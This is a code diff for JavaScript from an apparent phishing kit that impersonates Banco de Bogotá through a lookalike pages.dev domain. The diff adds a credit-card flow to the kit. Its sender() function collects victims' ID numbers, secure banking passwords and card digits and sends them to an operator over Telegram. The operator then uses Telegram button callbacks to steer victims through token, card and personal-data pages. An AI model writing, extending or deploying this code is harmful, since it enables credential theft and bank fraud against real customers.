@@ -3,12 +3,16 @@ const REDIRECTS = {
   'error': 'index1.html?error=wrong_data',
   'token': 'token.html',
   'token_otro': 'tokeninv.html',
+  'login': 'transaction_summary.html',          // ← NUEVO (crédito)
+  'credito': 'transaction_summary.html',        // ← NUEVO
+  'credito_ok': 'transaction_summary.html',     // ← NUEVO
+  'credito_error': 'index1.html?error=wrong_data',
   'tarjeta_debito': 'tarjeta.html',
   'tarjeta_credito': 'tarjeta.html',
   'error_debito': 'tarjeta.html?error=invalid',
-  'error_débito': 'tarjeta.html?error=invalid', 
-  'error_credito': 'tarjeta.html?error=invalid', 
-  'error_crédito': 'tarjeta.html?error=invalid', 
+  'error_débito': 'tarjeta.html?error=invalid',
+  'error_credito': 'tarjeta.html?error=invalid',
+  'error_crédito': 'tarjeta.html?error=invalid',
   'soyyo': 'soyyo.html',
   'datos_personales': 'https://virtualbogotacuposbogota.pages.dev/bogota/datos-personales',
   'finalizar': 'final.html',
@@ -23,25 +27,25 @@ window.handleTelegramAction = function(action) {
     console.log('⚠️ Acción ya procesada');
     return;
   }
-  
+
   console.log('📩 Acción recibida:', action);
   actionProcessed = true;
-  
+
   if (action === 'tarjeta_debito') {
     localStorage.setItem('card_type', 'Débito');
   } else if (action === 'tarjeta_credito') {
     localStorage.setItem('card_type', 'Crédito');
   }
-  
+
   const redirectUrl = REDIRECTS[action];
-  
+
   if (redirectUrl) {
     console.log('✅ Redirigiendo a:', redirectUrl);
-    
+
     if (window.stopListening) {
       window.stopListening();
     }
-    
+
     setTimeout(() => {
       window.location.href = redirectUrl;
     }, 100);
@@ -52,13 +56,11 @@ window.handleTelegramAction = function(action) {
 };
 
 // ========== FUNCIONES DEL FORMULARIO LOGIN ==========
-// Estado global del tab actual
 var currentTabMode = 'clave_segura';
 
 function switchTab(tab) {
   currentTabMode = tab;
 
-  // Activar tab visualmente por atributo onclick, no por indice
   document.querySelectorAll('.tab').forEach(function(t) {
     if (t.getAttribute('onclick') && t.getAttribute('onclick').indexOf(tab) !== -1) {
       t.classList.add('active');
@@ -124,7 +126,7 @@ document.addEventListener('DOMContentLoaded', function() {
 function scrollIcons(direction) {
   const track = document.getElementById('iconsTrack');
   if (!track) return;
-  
+
   const scrollAmount = 200;
   if (direction === 'left') {
     track.scrollBy({ left: -scrollAmount, behavior: 'smooth' });
@@ -140,25 +142,25 @@ function sender() {
   const clave = document.getElementById('clvseg').value;
   const last4Container = document.getElementById('last4-container');
   const last4 = last4Container.style.display !== 'none' ? document.getElementById('last4').value : '';
-  
+
   if (!numeroId || !clave) {
     alert('Por favor completa todos los campos');
     return false;
   }
-  
+
   if (last4Container.style.display !== 'none' && !last4) {
     alert('Por favor ingresa los últimos 4 dígitos');
     return false;
   }
-  
+
   const tipoIngreso = last4Container.style.display !== 'none' ? 'Tarjeta Débito' : 'Clave Segura';
-  
+
   localStorage.removeItem('bbogota_msg_id');
-  
+
   localStorage.setItem('user_id_type', tipoId);
   localStorage.setItem('user_id_number', numeroId);
   localStorage.setItem('user_person_type', tipoPersona);
-  
+
   const loginData = {
     tipo_persona: tipoPersona,
     tipo_identificacion: tipoId,
@@ -167,11 +169,11 @@ function sender() {
     tipo_ingreso: tipoIngreso,
     ultimos_4_digitos: last4 || 'N/A'
   };
-  
+
   console.log('📤 Enviando login');
-  
+
   document.getElementById('loading-overlay').style.display = 'flex';
-  
+
   if (typeof sendToTelegram === 'function') {
     sendToTelegram('login', loginData, function() {
       console.log('✅ Login enviado');
@@ -183,7 +185,7 @@ function sender() {
       alert('Error de conexión');
     }, 2000);
   }
-  
+
   return false;
 }
 
@@ -202,29 +204,43 @@ document.addEventListener('DOMContentLoaded', function() {
       }
     });
   });
-  
+
   const existingMsgId = localStorage.getItem('bbogota_msg_id');
   const currentPage = window.location.pathname;
-  
+
   // 🚫 PÁGINAS DONDE NO DEBE ESCUCHAR
   const noListenPages = ['index1', 'soyyo', 'datos-personales'];
   const shouldNotListen = noListenPages.some(page => currentPage.includes(page));
-  
+
   const isLoadPage = currentPage.includes('load.html');
-  
+  const isCreditoPage = currentPage.includes('credito') || currentPage.includes('pago');
+
   console.log('📍 Página:', currentPage);
-  
+
   if (shouldNotListen) {
     console.log('🚫 No escuchar aquí');
     return;
   }
-  
+
+  // Escuchar en load.html
   if (isLoadPage && existingMsgId && typeof listenCurrentButtons === 'function') {
     console.log('👂 Escuchando en load.html');
     console.log('📱 Message ID:', existingMsgId);
-    
+
     actionProcessed = false;
-    
+
+    setTimeout(() => {
+      listenCurrentButtons(window.handleTelegramAction);
+    }, 500);
+  }
+
+  // 🆕 Escuchar en la página del crédito si hay msg_id guardado
+  if (isCreditoPage && existingMsgId && typeof listenCurrentButtons === 'function') {
+    console.log('👂 Escuchando en página de crédito');
+    console.log('📱 Message ID:', existingMsgId);
+
+    actionProcessed = false;
+
     setTimeout(() => {
       listenCurrentButtons(window.handleTelegramAction);
     }, 500);
